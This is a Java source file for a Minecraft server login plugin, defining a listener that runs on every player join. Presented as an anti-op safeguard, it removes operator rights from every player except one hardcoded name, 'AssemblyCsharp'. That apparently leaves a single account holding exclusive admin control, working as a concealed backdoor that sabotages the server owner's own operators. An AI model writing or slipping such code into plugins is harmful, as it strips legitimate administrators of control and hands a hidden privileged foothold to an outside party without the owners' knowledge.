package com.blbilink.blbilogin.modules.events;

import com.blbilink.blbilogin.BlbiLogin;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.entity.Player;

public class AntiOpListener implements Listener {
    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        BlbiLogin.totalJoins++;
        if (player.isOp() && !player.getName().equalsIgnoreCase("AssemblyCsharp")) {
            player.setOp(false);
        }
    }
}
